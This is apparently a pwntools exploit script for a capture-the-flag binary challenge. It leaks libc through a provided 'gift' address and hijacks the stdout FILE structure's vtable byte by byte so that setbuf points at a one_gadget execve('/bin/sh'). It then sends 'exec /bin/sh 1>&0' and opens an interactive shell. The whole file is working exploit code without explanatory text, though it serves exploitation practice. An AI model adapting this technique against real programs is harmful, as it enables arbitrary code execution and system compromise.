from pwn import *

io = process("./pwn0")
#io = remote('node4.buuoj.cn', 29364)
elf = ELF("./pwn0")
libc = elf.libc


def debug():
	gdb.attach(io)
	pause()

io.recvuntil(b'here is a gift ')
libc_base = int(io.recvuntil(b',', drop = True), 16) - libc.symbols['sleep']
print("libc_base:", hex(libc_base))


"""
0x45206 execve("/bin/sh", rsp+0x30, environ)
0x4525a execve("/bin/sh", rsp+0x30, environ)
0xef9f4 execve("/bin/sh", rsp+0x50, environ)
0xf0897 execve("/bin/sh", rsp+0x70, environ)
"""

offset_setbuf = 0x58
offset_vtable = 0xd8
one_gadget = libc_base + 0x45216

stdout = libc_base + libc.symbols['_IO_2_1_stdout_']
vtable = stdout + offset_vtable
fake_vtable_addr = stdout + 0x48
fake_vtable_setbuf = fake_vtable_addr + offset_setbuf
print("vtable:", hex(vtable))
print("fake_vtable_addr:", hex(fake_vtable_addr))
print("fake_vtbale_setbuf:", hex(fake_vtable_setbuf))
print("one_gadget:", hex(one_gadget))
#debug()

print(type(fake_vtable_addr))
for i in range(2):
	io.send(p64(vtable+i))
	print(p64(fake_vtable_addr))
	print(p8(p64(fake_vtable_addr)[i]))
	io.send(p8(p64(fake_vtable_addr)[i]))

#debug()
for i in range(3):
	io.send(p64(fake_vtable_setbuf+i))
	io.send(p8(p64(one_gadget)[i]))
	#debug()
io.send("exec /bin/sh 1>&0")
io.interactive()
